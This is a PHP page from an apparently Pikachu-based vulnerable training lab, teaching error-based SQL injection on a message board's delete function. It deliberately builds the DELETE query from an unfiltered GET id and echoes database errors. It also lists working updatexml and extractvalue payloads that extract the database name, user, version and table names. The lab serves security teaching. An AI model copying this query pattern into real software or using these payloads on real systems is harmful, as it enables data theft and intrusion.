<?php
/**
 * Pikachu-Enhanced v2.0 - 删除型 SQL 注入 / 报错注入 (Error-based SQLi) 教学演练
 */
$PIKA_ROOT_DIR = "../../";
$ACTIVE = array_fill(0, 300, '');
$ACTIVE[35] = 'active open';
$ACTIVE[42] = 'active';
include_once $PIKA_ROOT_DIR . 'header.php';
include_once $PIKA_ROOT_DIR . "inc/config.inc.php";
include_once $PIKA_ROOT_DIR . "inc/function.php";
include_once $PIKA_ROOT_DIR . "inc/mysql.inc.php";

$link = connect();
$error_msg = "";
$success_msg = "";

// 留言提交处理
if (isset($_POST['submit']) && !empty($_POST['message'])) {
    $msg = escape($link, $_POST['message']);
    $q_ins = "INSERT INTO message (content, time) VALUES ('$msg', NOW())";
    @mysqli_query($link, $q_ins);
    $success_msg = "留言已成功发布！";
}

// 删除留言 (注入点)
if (isset($_GET['id'])) {
    $id = $_GET['id'];
    // 【核心漏洞点】：DELETE 语句中 id 参数未做过滤且数据库开启了错误回显，导致报错注入 (Error-based)
    $query = "DELETE FROM message WHERE id = {$id}";
    $res = @mysqli_query($link, $query);
    if (!$res) {
        $error_msg = mysqli_error($link);
    } else {
        $success_msg = "留言 ID [{$id}] 删除成功！";
    }
}

// 读取现有留言
$msg_list = [];
$res_m = @mysqli_query($link, "SELECT * FROM message ORDER BY id DESC LIMIT 10");
if ($res_m) {
    while ($row = mysqli_fetch_assoc($res_m)) {
        $msg_list[] = $row;
    }
}
?>

<div class="main-content">
    <div class="main-content-inner">
        <div class="breadcrumbs ace-save-state" id="breadcrumbs">
            <ul class="breadcrumb">
                <li><i class="ace-icon fa fa-home home-icon"></i><a href="sqli.php">SQL Injection</a></li>
                <li class="active">删除型 / 报错注入 (Error-based)</li>
            </ul>
            <a href="#" class="tips-btn" data-container="body" data-toggle="popover" data-placement="bottom" title="💡 报错注入常用函数" data-content="通过 updatexml(1,concat(0x7e,(SELECT database()),0x7e),1) 或 extractvalue(1,concat(0x7e,(SELECT user()))) 触发 XPath 语法错误，将敏感数据直接打印在错误信息中！">
                <i class="fa fa-lightbulb-o"></i> 攻防提示
            </a>
        </div>

        <div class="page-content">
            <div class="cyber-stage-container">
                <div class="cyber-header-card">
                    <h1 class="cyber-header-title">
                        🗑️ 6. 删除型 / 报错注入漏洞攻防教学 (Error-based SQLi)
                        <span class="cyber-badge-chip" style="border-color:#ef4444; color:#f87171; background:rgba(239,68,68,0.15);">报错注入 · updatexml · 150 PTS</span>
                    </h1>
                    <p class="cyber-desc-text">
                        在无直接数据回显位置的 SQL 语句中（如 <code>DELETE FROM table WHERE id=$id</code> 或 <code>INSERT / UPDATE</code>），若服务端开启了数据库报错回显（如 <code>mysqli_error()</code>），攻击者可利用 <b><code>updatexml()</code>、<code>extractvalue()</code>、<code>floor(rand(0)*2)</code></b> 等特殊函数构造语法格式异常，<b>迫使数据库将查询结果作为错误信息的一部分直接报错输出到前端</b>！
                    </p>
                </div>

                <?php if (!empty($error_msg)): ?>
                    <div class="alert alert-danger" style="border-radius:8px; font-size:13.5px; font-weight:600; padding:14px 18px; margin-bottom:20px;">
                        <i class="fa fa-bug"></i> <b>MySQL 报错注入回显捕获：</b><br/>
                        <pre style="background:transparent; border:none; color:#ef4444; font-family:monospace; margin-top:6px; padding:0;"><?php echo htmlspecialchars($error_msg); ?></pre>
                    </div>
                <?php elseif (!empty($success_msg)): ?>
                    <div class="alert alert-success" style="border-radius:8px; font-size:13.5px; font-weight:600; padding:14px 18px; margin-bottom:20px;">
                        <i class="fa fa-check-circle"></i> <?php echo htmlspecialchars($success_msg); ?>
                    </div>
                <?php endif; ?>

                <div class="row">
                    <!-- Left: Post & Delete Message -->
                    <div class="col-lg-6 col-md-12" style="margin-bottom:20px;">
                        <div class="cyber-login-card">
                            <h4 style="margin:0 0 14px 0; color:var(--text-primary); font-weight:800; font-size:16px;">
                                <i class="fa fa-commenting" style="color:#06b6d4;"></i> 留言板与删除操作
                            </h4>

                            <form method="POST" action="sqli_del.php" style="margin-bottom:18px;">
                                <div class="form-group" style="margin-bottom:10px;">
                                    <input type="text" name="message" class="form-control" placeholder="发表一条新留言..." required />
                                </div>
                                <button type="submit" name="submit" value="submit" class="btn btn-sm btn-info" style="border-radius:6px; font-weight:700;">
                                    <i class="fa fa-paper-plane"></i> 发表测试留言
                                </button>
                            </form>

                            <h5 style="font-weight:700; color:var(--text-primary); margin-bottom:10px;">留言列表 (点击删除触发 GET id)：</h5>
                            <div style="background:var(--bg-secondary); border:1px solid var(--border-color); border-radius:8px; padding:10px; max-height:220px; overflow-y:auto;">
                                <?php if (empty($msg_list)): ?>
                                    <p style="color:var(--text-muted); font-size:12px; margin:0; text-align:center; padding:10px;">暂无留言，可先发布一条</p>
                                <?php else: ?>
                                    <?php foreach ($msg_list as $m): ?>
                                        <div style="display:flex; justify-content:space-between; align-items:center; border-bottom:1px solid var(--border-color); padding:6px 4px; font-size:12.5px;">
                                            <span><b>#<?php echo $m['id']; ?>:</b> <?php echo htmlspecialchars($m['content']); ?></span>
                                            <a href="sqli_del.php?id=<?php echo $m['id']; ?>" class="btn btn-xs btn-danger" style="border-radius:4px;"><i class="fa fa-trash"></i> 删除</a>
                                        </div>
                                    <?php endforeach; ?>
                                <?php endif; ?>
                            </div>
                        </div>
                    </div>

                    <!-- Right: Error-Based Attack Simulator -->
                    <div class="col-lg-6 col-md-12" style="margin-bottom:20px;">
                        <div class="cyber-login-card">
                            <h4 style="margin:0 0 14px 0; color:var(--text-primary); font-weight:800; font-size:16px;">
                                <i class="fa fa-bolt" style="color:#ef4444;"></i> 报错注入 Payload 快速触发器
                            </h4>

                            <p style="color:var(--text-secondary); font-size:12.5px; line-height:1.6; margin-bottom:14px;">
                                点击以下报错注入载荷直接模拟对 <code>sqli_del.php?id=...</code> 发起攻击：
                            </p>

                            <div style="display:flex; flex-direction:column; gap:8px;">
                                <a href="sqli_del.php?id=1 or updatexml(1,concat(0x7e,(select database()),0x7e),1)" class="btn btn-sm btn-default text-left" style="border-radius:6px; font-family:monospace; font-size:12px;">
                                    <i class="fa fa-database" style="color:#f59e0b;"></i> <b>updatexml 报错：</b> 提取数据库库名
                                </a>
                                <a href="sqli_del.php?id=1 or updatexml(1,concat(0x7e,(select user()),0x7e),1)" class="btn btn-sm btn-default text-left" style="border-radius:6px; font-family:monospace; font-size:12px;">
                                    <i class="fa fa-user" style="color:#06b6d4;"></i> <b>updatexml 报错：</b> 提取数据库当前连接用户
                                </a>
                                <a href="sqli_del.php?id=1 or extractvalue(1,concat(0x7e,(select version()),0x7e))" class="btn btn-sm btn-default text-left" style="border-radius:6px; font-family:monospace; font-size:12px;">
                                    <i class="fa fa-server" style="color:#8b5cf6;"></i> <b>extractvalue 报错：</b> 提取 MySQL 核心版本号
                                </a>
                                <a href="sqli_del.php?id=1 or updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=database() limit 0,1),0x7e),1)" class="btn btn-sm btn-default text-left" style="border-radius:6px; font-family:monospace; font-size:12px;">
                                    <i class="fa fa-table" style="color:#ef4444;"></i> <b>updatexml 报错：</b> LIMIT 遍历数据表名
                                </a>
                            </div>
                        </div>
                    </div>
                </div>

                <!-- Navigation -->
                <div style="display:flex; justify-content:space-between; align-items:center; border-top:1px solid var(--border-color); padding-top:18px;">
                    <a href="sqli_x.php" class="btn btn-default" style="border-radius:8px;"><i class="fa fa-arrow-left"></i> 上一关：xx 型注入</a>
                    <a href="sqli_blind_b.php" class="btn btn-primary" style="border-radius:8px; font-weight:700;">下一关：布尔盲注 <i class="fa fa-arrow-right"></i></a>
                </div>
            </div>
        </div>
    </div>
</div>

<?php include_once $PIKA_ROOT_DIR . 'footer.php'; ?>
